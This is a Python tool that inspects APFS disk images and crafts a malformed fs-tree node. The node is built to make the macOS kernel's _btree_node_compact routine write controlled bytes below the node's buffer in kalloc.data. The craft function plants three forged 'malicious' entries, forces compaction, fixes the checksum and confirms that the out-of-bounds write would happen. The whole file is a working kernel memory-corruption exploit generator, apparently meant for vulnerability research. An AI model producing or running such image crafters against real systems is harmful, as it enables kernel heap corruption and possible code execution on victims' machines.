#!/usr/bin/env python3
"""Offline APFS fs-tree inspector/crafter for _btree_node_compact testing.

This tool never attaches or mounts an image.  It locates the newest volume
superblock and its current single-node fs-tree by on-disk object metadata.
"""

from __future__ import annotations

import argparse
import dataclasses
import pathlib
import shutil
import struct
import sys
from typing import Iterable


NX_MAGIC = b"NXSB"
APFS_MAGIC = b"APSB"
OBJECT_TYPE_MASK = 0xFFFF
OBJECT_TYPE_BTREE = 0x0002
OBJECT_TYPE_FS = 0x000D
OBJECT_TYPE_FSTREE = 0x000E
BTNODE_ROOT = 0x0001
BTNODE_LEAF = 0x0002
BTNODE_FIXED_KV_SIZE = 0x0004
BTREE_KV_NONALIGNED = 0x00000040
BTREE_INFO_SIZE = 0x28
J_OBJ_ID_MASK = 0x0FFFFFFFFFFFFFFF
J_OBJ_TYPE_SHIFT = 60

J_TYPES = {
    1: "snap-metadata",
    2: "physical-extent",
    3: "inode",
    4: "xattr",
    5: "sibling-link",
    6: "dstream-id",
    7: "crypto-state",
    8: "file-extent",
    9: "dir-record",
    10: "dir-stats",
    11: "snap-name",
    12: "sibling-map",
    13: "file-info",
}


def u16(buf: bytes | bytearray, off: int) -> int:
    return struct.unpack_from("<H", buf, off)[0]


def u32(buf: bytes | bytearray, off: int) -> int:
    return struct.unpack_from("<I", buf, off)[0]


def u64(buf: bytes | bytearray, off: int) -> int:
    return struct.unpack_from("<Q", buf, off)[0]


def fletcher64(block: bytes | bytearray) -> int:
    """Return APFS Fletcher-64 for an object block, excluding o_cksum."""
    modulus = (1 << 32) - 1
    lo = 0
    hi = 0
    body = memoryview(block)[8:]
    if len(body) % 4:
        raise ValueError("APFS object length after o_cksum is not u32-aligned")
    for (word,) in struct.iter_unpack("<I", body):
        lo = (lo + word) % modulus
        hi = (hi + lo) % modulus
    check1 = modulus - ((lo + hi) % modulus)
    check2 = modulus - ((lo + check1) % modulus)
    return (check2 << 32) | check1


def p16(buf: bytearray, off: int, value: int) -> None:
    struct.pack_into("<H", buf, off, value)


def p32(buf: bytearray, off: int, value: int) -> None:
    struct.pack_into("<I", buf, off, value)


def p64(buf: bytearray, off: int, value: int) -> None:
    struct.pack_into("<Q", buf, off, value)


@dataclasses.dataclass(frozen=True)
class Volume:
    paddr: int
    xid: int
    oid: int
    root_tree_oid: int


@dataclasses.dataclass(frozen=True)
class Entry:
    index: int
    toc_abs: int
    key_off: int
    key_len: int
    val_off: int
    val_len: int
    key_abs: int
    val_abs: int
    obj_id: int | None
    obj_type: int | None


@dataclasses.dataclass(frozen=True)
class FsTree:
    paddr: int
    oid: int
    xid: int
    flags: int
    level: int
    nkeys: int
    table_off: int
    table_len: int
    free_off: int
    free_len: int
    key_free_off: int
    key_free_len: int
    val_free_off: int
    val_free_len: int
    data_abs: int
    key_base_abs: int
    value_end_abs: int
    entries: tuple[Entry, ...]


def iter_block_offsets(image: bytes | bytearray, block_size: int) -> Iterable[tuple[int, int]]:
    for paddr, off in enumerate(range(0, len(image) - block_size + 1, block_size)):
        yield paddr, off


def find_newest_volume(image: bytes | bytearray, block_size: int) -> Volume:
    volumes: list[Volume] = []
    for paddr, off in iter_block_offsets(image, block_size):
        if image[off + 0x20 : off + 0x24] != APFS_MAGIC:
            continue
        if (u32(image, off + 0x18) & OBJECT_TYPE_MASK) != OBJECT_TYPE_FS:
            continue
        volumes.append(
            Volume(
                paddr=paddr,
                xid=u64(image, off + 0x10),
                oid=u64(image, off + 0x08),
                root_tree_oid=u64(image, off + 0x88),
            )
        )
    if not volumes:
        raise ValueError("no APFS volume superblock found")
    return max(volumes, key=lambda volume: volume.xid)


def parse_fstree(image: bytes | bytearray, block_size: int, paddr: int) -> FsTree:
    off = paddr * block_size
    flags = u16(image, off + 0x20)
    level = u16(image, off + 0x22)
    nkeys = u32(image, off + 0x24)
    table_off, table_len = struct.unpack_from("<HH", image, off + 0x28)
    free_off, free_len = struct.unpack_from("<HH", image, off + 0x2C)
    key_free_off, key_free_len = struct.unpack_from("<HH", image, off + 0x30)
    val_free_off, val_free_len = struct.unpack_from("<HH", image, off + 0x34)
    if flags & BTNODE_FIXED_KV_SIZE:
        raise ValueError("fs-tree leaf unexpectedly uses fixed-size TOC entries")
    if not (flags & BTNODE_ROOT and flags & BTNODE_LEAF) or level != 0:
        raise ValueError("tool currently requires a single-node root+leaf fs-tree")
    data_abs = off + 0x38
    toc_abs = data_abs + table_off
    key_base_abs = toc_abs + table_len
    value_end_abs = off + block_size - BTREE_INFO_SIZE
    entries: list[Entry] = []
    for index in range(nkeys):
        entry_abs = toc_abs + index * 8
        key_off, key_len, val_off, val_len = struct.unpack_from("<HHHH", image, entry_abs)
        key_abs = key_base_abs + key_off
        val_abs = value_end_abs - val_off
        if key_len >= 8 and key_abs + 8 <= off + block_size:
            raw_key = u64(image, key_abs)
            obj_id = raw_key & J_OBJ_ID_MASK
            obj_type = raw_key >> J_OBJ_TYPE_SHIFT
        else:
            obj_id = None
            obj_type = None
        entries.append(
            Entry(
                index=index,
                toc_abs=entry_abs,
                key_off=key_off,
                key_len=key_len,
                val_off=val_off,
                val_len=val_len,
                key_abs=key_abs,
                val_abs=val_abs,
                obj_id=obj_id,
                obj_type=obj_type,
            )
        )
    return FsTree(
        paddr=paddr,
        oid=u64(image, off + 0x08),
        xid=u64(image, off + 0x10),
        flags=flags,
        level=level,
        nkeys=nkeys,
        table_off=table_off,
        table_len=table_len,
        free_off=free_off,
        free_len=free_len,
        key_free_off=key_free_off,
        key_free_len=key_free_len,
        val_free_off=val_free_off,
        val_free_len=val_free_len,
        data_abs=data_abs,
        key_base_abs=key_base_abs,
        value_end_abs=value_end_abs,
        entries=tuple(entries),
    )


def find_current_fstree(
    image: bytes | bytearray, block_size: int, volume: Volume
) -> FsTree:
    candidates: list[FsTree] = []
    for paddr, off in iter_block_offsets(image, block_size):
        object_type = u32(image, off + 0x18) & OBJECT_TYPE_MASK
        subtype = u32(image, off + 0x1C) & OBJECT_TYPE_MASK
        if object_type != OBJECT_TYPE_BTREE or subtype != OBJECT_TYPE_FSTREE:
            continue
        if u64(image, off + 0x08) != volume.root_tree_oid:
            continue
        if u64(image, off + 0x10) > volume.xid:
            continue
        candidates.append(parse_fstree(image, block_size, paddr))
    if not candidates:
        raise ValueError(
            f"no root+leaf fs-tree for oid {volume.root_tree_oid:#x} was found"
        )
    return max(candidates, key=lambda tree: tree.xid)


def load_layout(path: pathlib.Path) -> tuple[bytearray, int, Volume, FsTree]:
    image = bytearray(path.read_bytes())
    if image[0x20:0x24] != NX_MAGIC:
        raise ValueError("input does not start with an APFS container superblock")
    block_size = u32(image, 0x24)
    if block_size < 0x1000 or block_size > 0x10000:
        raise ValueError(f"implausible APFS block size {block_size:#x}")
    if len(image) % block_size:
        raise ValueError("image size is not a multiple of nx_block_size")
    volume = find_newest_volume(image, block_size)
    tree = find_current_fstree(image, block_size, volume)
    return image, block_size, volume, tree


def print_layout(path: pathlib.Path) -> None:
    image, block_size, volume, tree = load_layout(path)
    node_off = tree.paddr * block_size
    stored = u64(image, node_off)
    computed = fletcher64(image[node_off : node_off + block_size])
    print(f"image={path}")
    print(
        f"block_size={block_size:#x} generic_allocator="
        f"{block_size not in (0x1000, 0x2000)}"
    )
    print(
        f"volume: paddr={volume.paddr:#x} oid={volume.oid:#x} "
        f"xid={volume.xid:#x} root_tree_oid={volume.root_tree_oid:#x}"
    )
    print(
        f"fs-tree: paddr={tree.paddr:#x} oid={tree.oid:#x} xid={tree.xid:#x} "
        f"flags={tree.flags:#x} level={tree.level} nkeys={tree.nkeys}"
    )
    print(
        "node spaces: "
        f"table=({tree.table_off:#x},{tree.table_len:#x}) "
        f"free=({tree.free_off:#x},{tree.free_len:#x}) "
        f"key_free=({tree.key_free_off:#x},{tree.key_free_len:#x}) "
        f"val_free=({tree.val_free_off:#x},{tree.val_free_len:#x})"
    )
    print(
        f"checksum: stored={stored:#018x} computed={computed:#018x} "
        f"ok={stored == computed}"
    )
    print("idx  object/type              key(off,len)    value(off,len)  value_abs")
    for entry in tree.entries:
        type_name = J_TYPES.get(entry.obj_type or -1, f"type-{entry.obj_type}")
        identity = (
            f"{entry.obj_id:#x}/{type_name}"
            if entry.obj_id is not None
            else "invalid-key"
        )
        print(
            f"{entry.index:3d}  {identity:23s} "
            f"({entry.key_off:#06x},{entry.key_len:#06x}) "
            f"({entry.val_off:#06x},{entry.val_len:#06x}) "
            f"{entry.val_abs:#x}"
        )


def tree_flags(image: bytes | bytearray, block_size: int, tree: FsTree) -> int:
    node_off = tree.paddr * block_size
    return u32(image, node_off + block_size - BTREE_INFO_SIZE)


def compact_moves(
    image: bytes | bytearray, block_size: int, tree: FsTree
) -> list[tuple[Entry, int, int, int]]:
    flags = tree_flags(image, block_size, tree)
    cumulative = 0
    moves: list[tuple[Entry, int, int, int]] = []
    for entry in sorted(tree.entries, key=lambda item: item.val_off):
        if entry.val_off > 0xFFFD:
            continue
        length = entry.val_len
        if not flags & BTREE_KV_NONALIGNED:
            length = (length + 7) & 0x1FFF8
            length &= 0xFFFF  # temporary inloc_t stores it with strh
        cumulative = (cumulative + length) & 0xFFFFFFFF
        destination = tree.value_end_abs - (cumulative & 0xFFFF)
        source = tree.value_end_abs - entry.val_off
        moves.append((entry, source, destination, length))
    return moves


def print_compact_simulation(
    image: bytes | bytearray, block_size: int, tree: FsTree
) -> None:
    node_start = tree.paddr * block_size
    node_end = node_start + block_size
    flags = tree_flags(image, block_size, tree)
    print(
        f"compact simulation: bt_flags={flags:#x} "
        f"nonaligned={bool(flags & BTREE_KV_NONALIGNED)}"
    )
    print("idx  src range                         dst range                         verdict")
    for entry, source, destination, length in compact_moves(image, block_size, tree):
        source_end = source + length
        destination_end = destination + length
        source_ok = node_start <= source and source_end <= tree.value_end_abs
        if destination < node_start:
            verdict = f"WRITE-BELOW by {node_start - destination:#x}"
        elif destination_end > node_end:
            verdict = f"WRITE-ABOVE by {destination_end - node_end:#x}"
        else:
            verdict = "in-node"
        print(
            f"{entry.index:3d}  [{source:#x},{source_end:#x}) "
            f"[{destination:#x},{destination_end:#x}) "
            f"{verdict}; source_in_node={source_ok}"
        )


def craft_image(source: pathlib.Path, output: pathlib.Path, marker: bytes) -> None:
    if output.exists():
        raise ValueError(f"refusing to overwrite existing output {output}")
    image, block_size, volume, tree = load_layout(source)
    if block_size in (0x1000, 0x2000):
        raise ValueError(
            f"block size {block_size:#x} uses an APFS dedicated zone, not kalloc.data"
        )
    if block_size != 0x4000:
        raise ValueError("this recipe is calibrated for a newfs_apfs -b 16384 image")
    if tree.nkeys + 3 > tree.table_len // 8:
        raise ValueError("fs-tree TOC has fewer than three unused entries")
    if tree.flags != (BTNODE_ROOT | BTNODE_LEAF) or tree.level != 0:
        raise ValueError("recipe requires the fresh root+leaf variable-KV fs-tree")
    if tree.free_off + 3 * 8 >= 0x1000:
        raise ValueError("unexpectedly large key area in fresh fs-tree")

    node_start = tree.paddr * block_size
    node_end = node_start + block_size
    source_start = tree.value_end_abs - 0x3000
    source_end = tree.value_end_abs - 0x0800
    new_key_end = tree.key_base_abs + tree.free_off + 3 * 8
    if source_start <= new_key_end:
        raise ValueError("marker source range overlaps the key area")
    if source_end > tree.value_end_abs:
        raise ValueError("marker source range exceeds the value area")

    # Fill every source span used by the three malicious entries.  Existing
    # live values and the root's btree_info_t remain untouched.
    if len(marker) != 8:
        raise ValueError("marker must encode to exactly eight bytes")
    marker_len = source_end - source_start
    image[source_start:source_end] = (marker * ((marker_len + 7) // 8))[:marker_len]

    max_obj_id = max(
        entry.obj_id for entry in tree.entries if entry.obj_id is not None
    )
    first_obj_id = max(0x100, max_obj_id + 1)
    malicious = (
        (0x2000, 0x1800),
        (0x2800, 0x1800),
        (0x3000, 0x1800),
    )
    for relative_index, (val_off, val_len) in enumerate(malicious):
        index = tree.nkeys + relative_index
        toc_abs = tree.data_abs + tree.table_off + index * 8
        key_off = tree.free_off + relative_index * 8
        key_abs = tree.key_base_abs + key_off
        # A high, otherwise-unreferenced inode key stays after all baseline
        # keys, so lookup of the root directory never needs its value.
        raw_key = (3 << J_OBJ_TYPE_SHIFT) | (first_obj_id + relative_index)
        p64(image, key_abs, raw_key)
        struct.pack_into("<HHHH", image, toc_abs, key_off, 8, val_off, val_len)

    new_nkeys = tree.nkeys + 3
    p32(image, node_start + 0x24, new_nkeys)
    p16(image, node_start + 0x2C, tree.free_off + 3 * 8)
    p16(image, node_start + 0x2E, 0)  # insertion must compact
    p16(image, node_start + 0x30, 0xFFFF)
    p16(image, node_start + 0x32, 0x3000)
    p16(image, node_start + 0x34, 0xFFFF)
    p16(image, node_start + 0x36, 0x3000)

    btree_info = node_end - BTREE_INFO_SIZE
    p32(image, btree_info + 0x14, max(u32(image, btree_info + 0x14), 0x1800))
    p64(image, btree_info + 0x18, new_nkeys)

    p64(image, node_start, fletcher64(image[node_start:node_end]))
    output.parent.mkdir(parents=True, exist_ok=True)
    output.write_bytes(image)

    crafted_image, crafted_bs, crafted_volume, crafted_tree = load_layout(output)
    if crafted_bs != block_size or crafted_volume.root_tree_oid != volume.root_tree_oid:
        raise ValueError("post-write layout verification failed")
    moves = compact_moves(crafted_image, crafted_bs, crafted_tree)
    below = [
        move
        for move in moves
        if move[2] < crafted_tree.paddr * crafted_bs and move[3] != 0
    ]
    if not below:
        raise ValueError("crafted image does not simulate a write below the node")
    if any(
        source < node_start or source + length > crafted_tree.value_end_abs
        for _, source, _, length in moves
    ):
        raise ValueError("at least one compact source span leaves the node")

    print(f"WROTE {output}")
    print(
        f"root fs-tree paddr={crafted_tree.paddr:#x}, nkeys "
        f"{tree.nkeys}->{crafted_tree.nkeys}, marker={marker!r}"
    )
    print_compact_simulation(crafted_image, crafted_bs, crafted_tree)


def main() -> int:
    parser = argparse.ArgumentParser()
    subparsers = parser.add_subparsers(dest="command", required=True)
    inspect_parser = subparsers.add_parser("inspect")
    inspect_parser.add_argument("image", type=pathlib.Path)
    craft_parser = subparsers.add_parser("craft")
    craft_parser.add_argument("source", type=pathlib.Path)
    craft_parser.add_argument("output", type=pathlib.Path)
    craft_parser.add_argument(
        "--marker",
        default="APFSVAL!",
        help="exactly eight ASCII bytes repeated through controlled source spans",
    )
    args = parser.parse_args()
    try:
        if args.command == "inspect":
            print_layout(args.image)
            image, block_size, _, tree = load_layout(args.image)
            print_compact_simulation(image, block_size, tree)
        elif args.command == "craft":
            craft_image(args.source, args.output, args.marker.encode("ascii"))
    except (OSError, UnicodeEncodeError, ValueError, struct.error) as error:
        print(f"error: {error}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
